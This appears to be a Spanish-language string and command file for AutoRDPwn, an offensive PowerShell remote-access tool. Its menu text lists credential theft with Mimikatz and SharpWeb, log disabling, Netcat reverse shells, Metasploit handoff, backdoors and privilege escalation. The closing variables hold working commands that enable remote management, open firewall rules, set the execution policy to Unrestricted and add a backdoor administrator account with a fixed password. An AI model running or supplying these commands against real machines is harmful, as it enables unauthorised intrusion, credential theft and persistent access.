﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
 
$txt1  = "Cargar módulos adicionales"
$txt2  = "Cerrar el programa"
$txt3  = "Tu versión de Powershell no es compatible con este script :("
$txt4  = "Puedes descargar la última versión aquí"
$txt5  = "Tu sistema operativo no es compatible con este ataque"
$txt6  = "Opción incorrecta, vuelve a intentarlo de nuevo"
$txt7  = "Elige cómo quieres lanzar el ataque:` "
$txt8  = "Elige el módulo que quieres cargar:` "
$txt9  = "Extraer hashes locales con Mimikatz"
$txt10 = "Extraer contraseñas del sistema con Mimikatz"
$txt11 = "Reconstruir la caché de imágenes"
$txt12 = "Recuperar historial de escritorio remoto"
$txt13 = "Sistema de $system detectado, descargando Mimikatz.."
$txt14 = "Redireccionar un puerto local"
$txt15 = "Redireccionar un puerto remoto"
$txt16 = "Consultar redirecciones creadas"
$txt17 = "Acceso Remoto"
$txt18 = "Desactivar logs del sistema"
$txt19 = "Este proceso puede tardar varios minutos.."
$txt20 = "Eliminar todas las redirecciones"
$txt21 = "Módulo cargado con éxito!"
$txt22 = "Volver al menú principal"
$txt23 = "Cuál es la IP del servidor?:` "
$txt24 = "Y el usuario?:` "
$txt25 = "Escribe la contraseña:` "
$txt26 = "Introduce el dominio:` "
$txt27 = "Por último, el hash NTLM:` "
$txt28 = "Elevando privilegios con token duplication.."
$txt29 = "Quieres ver o controlar el equipo?:` "
$txt30 = "Modificando permisos para visualizar el equipo remoto.."
$txt31 = "Modificando permisos para controlar el equipo remoto.."
$txt32 = "Cambios en el registro de Windows realizados con éxito!"
$txt33 = "Detectando versión del sistema operativo en` "
$txt34 = "Modificando permisos para entrar sin credenciales.."
$txt35 = "Buscando sesiones activas en el equipo.."
$txt36 = "A qué sesión quieres conectarte?:` "
$txt37 = "detectado, aplicando cambios.."
$txt38 = "Iniciando conexión remota!"
$txt39 = "Consola semi-interactiva (WinRS)"
$txt40 = "Algo salió mal, cerrando el programa.."
$txt41 = "Introduce el puerto local:` "
$txt42 = "Qué interfaz quieres usar?:` "
$txt43 = "Introduce el puerto remoto:` "
$txt44 = "Por último, la IP de destino:` "
$txt45 = "Redirección creada correctamente!"
$txt46 = "Configuración guardada correctamente!"
$txt47 = "No existe ninguna redirección para mostrar"
$txt48 = "Todas las redirecciones han sido eliminadas"
$txt49 = "Obtener contraseñas de los navegadores con SharpWeb"
$txt50 = "Contraseñas y hashes"
$txt51 = "Consola de Netcat (conexión directa)"
$txt52 = "Consola de Netcat (conexión inversa)"
$txt53 = "Introduce el puerto a escuchar:` "
$txt54 = "Introduce la IP remota:` "
$txt55 = "Introduce la IP o el rango de red:` "
$txt56 = "Introduce la velocidad de escaneo (1-5):` "
$txt57 = "Introduce la cantidad de puertos a escanear (25-1000):` "
$txt58 = "Perfil de todos los usuarios"
$txt59 = "Recuperar contraseñas Wi-Fi"
$txt60 = "No existe ninguna red inalámbrica en este equipo"
$txt61 = "Recuperar credenciales de sesión RDP"
$txt62 = "Servidor VNC Remoto (legacy)"
$txt63 = "Pega esto en tu consola de Metasploit Framework:` "
$txt64 = "Backdoors y persistencia"
$txt65 = "Introduce la IP donde se está ejecutando MSF:` "
$txt66 = "Todo listo! Ahora ejecuta el siguiente comando:` "
$txt67 = "Ejecutar un script externo"
$txt68 = "Escalada de privilegios"
$txt69 = "Otros módulos"
$txt70 = "Obtener información del sistema operativo"
$txt71 = "Buscar vulnerabilidades con Sherlock"
$txt72 = "Escalar privilegios con PowerUp"
$txt73 = "Introduce la ruta o url del script:` "
$txt74 = "Escribe la función que quieres ejecutar:` "
$txt75 = "Esperando que terminen todos los procesos.."
$txt76 = "Limpieza completada!"
$txt77 = "Deshaciendo cambios en el equipo remoto.."
$txt78 = "Introduce el nombre de usuario:` "
$txt79 = "Cambiar de usuario con RunAs"
$txt80 = "Comprobando credenciales en el equipo local.."
$txt81 = "Credenciales incorrectas! Volviendo al menú principal.."
$txt82 = "Cargando AutoRDPwn con el nuevo usuario.."
$Pwn1  = "Set-NetConnectionProfile -InterfaceIndex ((Get-NetConnectionProfile).interfaceindex) -NetworkCategory Private ; winrm quickconfig -force ; Enable-PSRemoting -Force"
$Pwn2  = "Set-NetFirewallRule -DisplayGroup 'Asistencia Remota' -Enabled True ; Set-NetFirewallRule -DisplayGroup 'Escritorio Remoto' -Enabled True ; Set-ExecutionPolicy Unrestricted -Force"
$Pwn3  = "Set-NetFirewallRule -DisplayGroup 'Detección de redes' -Enabled True ; Set-NetFirewallRule -DisplayGroup 'Administración Remota de tareas programadas' -Enabled True"
$Pwn4  = "Set-NetFirewallRule -DisplayGroup 'Instrumental de Administración de Windows (WMI)' -Enabled True ; Set-NetFirewallRule -DisplayGroup 'Administración remota de Windows' -Enabled True"
$Pwn5  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDPwn /add"
$Pwn6  = "Agente de sesión de RDP"
